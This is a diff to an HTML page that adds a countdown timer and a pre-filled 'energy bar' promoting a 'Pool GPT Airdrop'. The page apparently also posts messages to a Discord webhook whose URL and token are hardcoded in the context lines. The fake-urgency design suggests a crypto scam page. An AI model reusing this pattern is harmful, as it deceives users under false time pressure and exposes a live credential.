@@ -288,6 +288,30 @@
     .count {
         animation: count-up 525s linear forwards;
     }
+	#energy-bar {
+  width: 100%;
+  height: 20px;
+  background-color: #eee;
+  position: relative;
+}
+
+#energy {
+  width: 78%;
+  height: 100%;
+  background-color: #6ab04c;
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+#energy-bar p {
+  position: absolute;
+  top: 25px;
+  left: 0;
+  width: 100%;
+  text-align: center;
+}
+
 </style>
 
 <script>
@@ -308,6 +332,45 @@
     }
 
     setTimeout(updateCounter, 3000);
+</script>
+	  <script>
+	  // Obtenemos el elemento del contador
+var timer = document.getElementById('timer');
+
+// Obtenemos el elemento de la barra de energía
+var energy = document.getElementById('energy');
+
+// Establecemos la hora límite para el contador
+var deadline = new Date();
+deadline.setHours(deadline.getHours() + 10);
+
+// Actualizamos el contador y la barra de energía cada segundo
+var interval = setInterval(function() {
+  // Calculamos el tiempo restante
+  var now = new Date();
+  var remaining = deadline.getTime() - now.getTime();
+  var seconds = Math.floor(remaining / 1000);
+
+  // Actualizamos el contenido del contador
+  timer.innerHTML = formatTime(seconds);
+
+  // Calculamos el porcentaje de la barra de energía que debe mostrarse
+  var percentage = (remaining / (10 * 60 * 60 * 1000)) * 78;
+  energy.style.width = percentage + '%';
+
+  // Detenemos el intervalo cuando el tiempo restante llega a cero
+  if (seconds <= 0) {
+    clearInterval(interval);
+    timer.innerHTML = "0:00";
+  }
+}, 1000);
+
+// Función para formatear el tiempo restante en formato mm:ss
+function formatTime(seconds) {
+  var minutes = Math.floor(seconds / 60);
+  var remainingSeconds = seconds % 60;
+  return minutes + ":" + (remainingSeconds < 10 ? "0" : "") + remainingSeconds;
+}
 </script>
 
 
@@ -406,6 +469,14 @@ function sendWebhookMessage(webhookUrl, message) {
       const webhookUrl = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-";
 
     </script>
+	  <div id="countdown">
+  <p>Tiempo restante de promoción: <span id="timer"></span></p>
+  <div id="energy-bar">
+    <div id="energy"></div>
+    <p>Pool GPT Airdrop</p>
+  </div>
+</div>
+
   </body>
 </html>
 
